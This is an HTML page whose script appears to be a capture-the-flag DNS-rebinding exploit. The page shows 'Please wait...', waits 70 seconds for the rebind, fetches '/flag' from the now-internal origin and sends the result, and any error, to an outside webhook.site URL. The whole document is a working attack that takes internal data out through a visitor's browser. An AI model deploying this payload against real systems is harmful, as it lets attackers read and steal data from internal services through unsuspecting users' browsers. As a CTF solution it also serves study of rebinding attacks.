<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h2>Please wait...</h2>

    <script>
        // Replace with your actual webhook ID from webhook.site
        const WEBHOOK_URL = 'https://webhook.site/aeb7e887-f78a-487d-bb97-52b3842d26de';

        console.log('Script started, waiting for DNS rebind...');

        setTimeout(() => {
            console.log('Timeout completed, fetching flag...');

            fetch('/flag')
                .then(response => {
                    console.log('Response status:', response.status);
                    if (!response.ok) {
                        throw new Error('HTTP error! status: ' + response.status);
                    }
                    return response.text();
                })
                .then(flag => {
                    console.log('Flag received:', flag);

                    // Send flag to webhook
                    return fetch(WEBHOOK_URL + '?flag=' + encodeURIComponent(flag));
                })
                .then(() => {
                    console.log('Flag sent to webhook successfully');
                })
                .catch(error => {
                    console.error('Error:', error);
                    // Send error to webhook
                    fetch(WEBHOOK_URL + '?error=' + encodeURIComponent(error.message));
                });
        }, 70000); // 70 seconds to ensure DNS rebinding
    </script>
</body>
</html>
